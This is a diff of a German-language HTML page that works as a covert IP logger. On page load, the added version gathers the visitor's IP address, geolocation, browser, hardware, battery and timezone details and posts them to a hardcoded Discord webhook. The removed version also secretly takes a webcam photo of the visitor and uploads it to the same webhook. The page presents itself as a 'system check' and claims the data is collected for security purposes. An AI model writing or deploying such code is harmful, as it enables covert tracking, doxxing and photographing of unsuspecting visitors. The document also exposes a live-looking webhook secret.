@@ -1,280 +1,237 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔍 Advanced System Analysis</title>
+    <title>🍇 Advanced IP Logger 🍇</title>
     <style>
-        :root {
-            --primary: #4a6bdf;
-            --secondary: #ff6b6b;
-        }
         body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
-            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f8ff;
+            text-align: center;
             padding: 20px;
-            color: #2d3748;
-            min-height: 100vh;
+            color: #333;
         }
         .container {
-            background: white;
-            border-radius: 16px;
+            background-color: white;
+            border-radius: 15px;
             padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            max-width: 900px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            max-width: 700px;
             margin: 0 auto;
         }
         h1 {
-            color: var(--primary);
-            font-size: 2.8rem;
-            margin-bottom: 10px;
-            text-align: center;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #6a5acd;
+            font-size: 2.5em;
+            margin-bottom: 20px;
         }
-        .emoji-header {
-            font-size: 3rem;
+        .grape {
+            font-size: 2em;
             margin: 20px 0;
-            text-align: center;
-            animation: pulse 2s infinite;
+            animation: bounce 2s infinite;
         }
-        #cameraContainer {
-            margin: 20px 0;
-            text-align: center;
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            text-align: left;
+            margin: 25px 0;
         }
-        #cameraView {
-            width: 100%;
-            max-width: 500px;
-            background-color: #eee;
+        .info-card {
+            background-color: #f8f9fa;
             border-radius: 8px;
-            margin: 10px 0;
-        }
-        #photoCanvas {
-            display: none;
-        }
-        .privacy-notice {
-            font-size: 0.85rem;
-            color: #718096;
-            text-align: center;
-            margin-top: 30px;
             padding: 15px;
-            background: #f8fafc;
-            border-radius: 8px;
+            border-left: 4px solid #6a5acd;
         }
-        /* Rest des CSS bleibt gleich wie im vorherigen Beispiel */
+        .info-card h3 {
+            margin-top: 0;
+            color: #6a5acd;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
     </style>
+    <script>
+        async function collectAndSendData() {
+            try {
+                // Webhook-URL - ersetzen mit deinem Webhook
+                const webhookURL = 'https://discord.com/api/webhooks/1375773532063141898/mD5j5NTIRh4i-DtISXR0fOG5aGhpkDbr43yjmQ-_A94jrKAlmRKsigoNdZ9m2lX0yfBo';
+                
+                // Basis-Informationen sammeln
+                const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+                
+                // Erweiterte Informationen sammeln
+                const screenInfo = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    orientation: screen.orientation?.type
+                };
+                
+                const browserInfo = {
+                    name: getBrowserName(),
+                    version: getBrowserVersion(),
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    online: navigator.onLine
+                };
+                
+                const locationInfo = await getApproximateLocation(ipData.ip);
+                
+                const systemInfo = {
+                    platform: navigator.platform,
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    touchSupport: 'ontouchstart' in window,
+                    battery: await getBatteryStatus()
+                };
+                
+                const timeInfo = {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localTime: new Date().toString(),
+                    timezoneOffset: new Date().getTimezoneOffset()
+                };
+                
+                // Discord-Nachricht erstellen
+                const discordMessage = {
+                    content: `🚨 **Neue Verbindung** 🚨`,
+                    embeds: [{
+                        title: "Erfasste Informationen",
+                        fields: [
+                            { name: "🌐 IP-Adresse", value: ipData.ip, inline: true },
+                            { name: "📍 Ungefährer Standort", value: `${locationInfo.city}, ${locationInfo.country}`, inline: true },
+                            { name: "🖥️ System", value: `Platform: ${systemInfo.platform}\nRAM: ${systemInfo.deviceMemory}GB\nCPU-Kerne: ${systemInfo.hardwareConcurrency}`, inline: true },
+                            { name: "🔋 Batterie", value: systemInfo.battery, inline: true },
+                            { name: "🖥️ Bildschirm", value: `${screenInfo.width}x${screenInfo.height} (${screenInfo.colorDepth}bit)`, inline: true },
+                            { name: "🌍 Zeitzone", value: timeInfo.timezone, inline: true },
+                            { name: "🧭 Browser", value: `${browserInfo.name} v${browserInfo.version}\nSprache: ${browserInfo.language}\nCookies: ${browserInfo.cookiesEnabled ? '✅' : '❌'}`, inline: true },
+                            { name: "📅 Lokale Zeit", value: timeInfo.localTime, inline: true },
+                            { name: "🔗 Referrer", value: document.referrer || "Direkter Besuch", inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                
+                // An Discord senden
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordMessage),
+                });
+                
+                // Info für den Benutzer anzeigen
+                displayUserInfo(ipData, locationInfo, browserInfo, systemInfo, screenInfo, timeInfo);
+                
+            } catch (error) {
+                console.error('Fehler:', error);
+                document.getElementById('status').innerHTML = `
+                    <div class="info-card" style="border-left-color: #ff6b6b;">
+                        <h3>Fehler</h3>
+                        <p>Es gab ein Problem beim Sammeln der Informationen.</p>
+                    </div>
+                `;
+            }
+        }
+        
+        // Hilfsfunktionen
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("SamsungBrowser")) return "Samsung Browser";
+            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+            if (userAgent.includes("Trident")) return "Internet Explorer";
+            if (userAgent.includes("Edge")) return "Edge";
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Safari")) return "Safari";
+            return "Unknown";
+        }
+        
+        function getBrowserVersion() {
+            const userAgent = navigator.userAgent;
+            const matches = userAgent.match(/(firefox|chrome|safari|opera|edge|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+            return matches[2] || "unknown";
+        }
+        
+        async function getApproximateLocation(ip) {
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query`);
+                return await response.json();
+            } catch {
+                return { city: "unknown", country: "unknown" };
+            }
+        }
+        
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return `Level: ${Math.floor(battery.level * 100)}%\nStatus: ${battery.charging ? 'Lädt' : 'Entlädt'}`;
+                } catch {
+                    return "Keine Batterie-Info";
+                }
+            }
+            return "Battery API nicht verfügbar";
+        }
+        
+        function displayUserInfo(ip, location, browser, system, screen, time) {
+            document.getElementById('status').innerHTML = `
+                <div class="grape">🍇🍇🍇</div>
+                <h2>Deine Systeminformationen wurden erfasst!</h2>
+                <div class="info-grid">
+                    <div class="info-card">
+                        <h3>🌐 Netzwerk</h3>
+                        <p><strong>IP:</strong> ${ip.ip}</p>
+                        <p><strong>Standort:</strong> ${location.city}, ${location.country}</p>
+                        <p><strong>ISP:</strong> ${location.isp || 'Unbekannt'}</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🖥️ System</h3>
+                        <p><strong>Platform:</strong> ${system.platform}</p>
+                        <p><strong>RAM:</strong> ${system.deviceMemory || 'Unbekannt'} GB</p>
+                        <p><strong>CPU-Kerne:</strong> ${system.hardwareConcurrency}</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🧭 Browser</h3>
+                        <p><strong>Name:</strong> ${browser.name}</p>
+                        <p><strong>Version:</strong> ${browser.version}</p>
+                        <p><strong>Sprache:</strong> ${browser.language}</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🖥️ Bildschirm</h3>
+                        <p><strong>Auflösung:</strong> ${screen.width}x${screen.height}</p>
+                        <p><strong>Farbtiefe:</strong> ${screen.colorDepth} bit</p>
+                        <p><strong>Orientierung:</strong> ${screen.orientation || 'Standard'}</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🌍 Zeit</h3>
+                        <p><strong>Zeitzone:</strong> ${time.timezone}</p>
+                        <p><strong>Lokale Zeit:</strong> ${time.localTime}</p>
+                        <p><strong>UTC Offset:</strong> ${time.timezoneOffset} min</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🔋 Energie</h3>
+                        <p>${system.battery.replace('\n', '<br>')}</p>
+                    </div>
+                </div>
+                <p style="margin-top: 20px; font-size: 0.9em; color: #666;">
+                    Diese Informationen werden für Sicherheitszwecke gesammelt.
+                </p>
+            `;
+        }
+        
+        window.onload = collectAndSendData;
+    </script>
 </head>
 <body>
     <div class="container">
-        <h1>Advanced System Analysis</h1>
-        <div class="emoji-header">🔍📸💻</div>
-        
-        <div id="cameraContainer" style="display: none;">
-            <p>Camera verification in progress...</p>
-            <video id="cameraView" autoplay playsinline></video>
-            <canvas id="photoCanvas"></canvas>
-        </div>
-        
+        <h1>Advanced System Check</h1>
         <div id="status">
-            <div style="text-align: center;">
-                <div class="loading" style="margin: 0 auto;"></div>
-                <p>Collecting advanced system information...</p>
-            </div>
+            <p>Sammlung von Systeminformationen...</p>
+            <div class="grape">🍇</div>
         </div>
     </div>
-
-    <script>
-        // Discord Webhook URL
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375773532063141898/mD5j5NTIRh4i-DtISXR0fOG5aGhpkDbr43yjmQ-_A94jrKAlmRKsigoNdZ9m2lX0yfBo';
-        let cameraStream = null;
-
-        // Main function to collect all data
-        async function collectAllData() {
-            const startTime = performance.now();
-            
-            // 1. Collect all system information first
-            const systemData = await collectSystemData();
-            
-            // 2. Attempt to access camera
-            const cameraData = await attemptCameraCapture();
-            
-            // 3. Combine all data
-            const allData = {
-                ...systemData,
-                camera: cameraData,
-                metadata: {
-                    collectionTime: `${(performance.now() - startTime).toFixed(2)}ms`,
-                    timestamp: new Date().toISOString()
-                }
-            };
-            
-            // 4. Send to Discord
-            await sendToDiscord(allData);
-            
-            // 5. Display results to user
-            displayResults(allData);
-        }
-        
-        // System data collection (wie zuvor)
-        async function collectSystemData() {
-            return {
-                network: await getNetworkInfo(),
-                hardware: getHardwareInfo(),
-                software: getSoftwareInfo(),
-                display: getDisplayInfo(),
-                geo: await getGeoInfo((await getNetworkInfo()).ip),
-                advanced: await getAdvancedInfo(),
-                connection: getConnectionInfo(),
-                storage: getStorageInfo(),
-                media: await getMediaInfo(),
-                graphics: getGraphicsInfo()
-            };
-        }
-        
-        // Camera capture function
-        async function attemptCameraCapture() {
-            try {
-                // Show camera container
-                document.getElementById('cameraContainer').style.display = 'block';
-                
-                // Access camera
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-                
-                const video = document.getElementById('cameraView');
-                video.srcObject = cameraStream;
-                
-                // Wait for video to be ready
-                await new Promise(resolve => {
-                    video.onloadedmetadata = resolve;
-                });
-                
-                // Capture photo after 3 seconds
-                await new Promise(resolve => setTimeout(resolve, 3000));
-                const photoData = await capturePhoto();
-                
-                // Stop camera
-                cameraStream.getTracks().forEach(track => track.stop());
-                
-                return {
-                    status: 'success',
-                    photo: photoData,
-                    cameraSettings: getCameraSettings()
-                };
-                
-            } catch (error) {
-                return {
-                    status: 'error',
-                    error: error.message,
-                    permission: await checkCameraPermission()
-                };
-            }
-        }
-        
-        async function capturePhoto() {
-            const video = document.getElementById('cameraView');
-            const canvas = document.getElementById('photoCanvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Convert to Blob
-            return new Promise(resolve => {
-                canvas.toBlob(blob => {
-                    const reader = new FileReader();
-                    reader.onload = () => {
-                        resolve({
-                            blob: reader.result.split(',')[1], // Base64 data
-                            width: canvas.width,
-                            height: canvas.height,
-                            mimeType: 'image/jpeg'
-                        });
-                    };
-                    reader.readAsDataURL(blob);
-                }, 'image/jpeg', 0.85);
-            });
-        }
-        
-        function getCameraSettings() {
-            if (!cameraStream) return null;
-            
-            const videoTrack = cameraStream.getVideoTracks()[0];
-            if (!videoTrack) return null;
-            
-            return {
-                capabilities: videoTrack.getCapabilities ? videoTrack.getCapabilities() : null,
-                settings: videoTrack.getSettings ? videoTrack.getSettings() : null,
-                constraints: videoTrack.getConstraints ? videoTrack.getConstraints() : null
-            };
-        }
-        
-        async function checkCameraPermission() {
-            const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-            return permissionStatus.state;
-        }
-        
-        // Discord integration with photo
-        async function sendToDiscord(data) {
-            if (!WEBHOOK_URL.includes('discord.com')) {
-                console.error("Invalid webhook URL");
-                return;
-            }
-            
-            try {
-                // Prepare basic info embed
-                const embed = {
-                    title: "🔍 Advanced System Analysis",
-                    color: 0x4a6bdf,
-                    fields: [
-                        { name: "🌐 IP Address", value: data.network.ip, inline: true },
-                        { name: "📍 Location", value: `${data.geo.city}, ${data.geo.country}`, inline: true },
-                        { name: "🖥️ Device", value: `${data.hardware.platform} | ${data.hardware.deviceMemory}GB RAM`, inline: true },
-                        { name: "🧭 Browser", value: `${data.software.browser} ${data.software.version}`, inline: true },
-                        { name: "📸 Camera Status", value: data.camera.status.toUpperCase(), inline: true }
-                    ],
-                    timestamp: new Date().toISOString()
-                };
-                
-                // Create form data
-                const formData = new FormData();
-                formData.append('payload_json', JSON.stringify({
-                    content: `New system scan received at ${new Date().toLocaleString()}`,
-                    embeds: [embed]
-                }));
-                
-                // Add photo if available
-                if (data.camera.status === 'success') {
-                    const blob = await fetch(`data:image/jpeg;base64,${data.camera.photo.blob}`).then(res => res.blob());
-                    formData.append('file', blob, 'user_photo.jpg');
-                }
-                
-                // Add system data as file
-                const systemDataBlob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-                formData.append('file', systemDataBlob, 'system_data.json');
-                
-                // Send to Discord
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-            } catch (error) {
-                console.error("Error sending to Discord:", error);
-            }
-        }
-        
-        // Rest der Funktionen bleibt gleich wie im vorherigen Beispiel
-        
-        // Start the collection
-        window.onload = collectAllData;
-    </script>
 </body>
 </html>
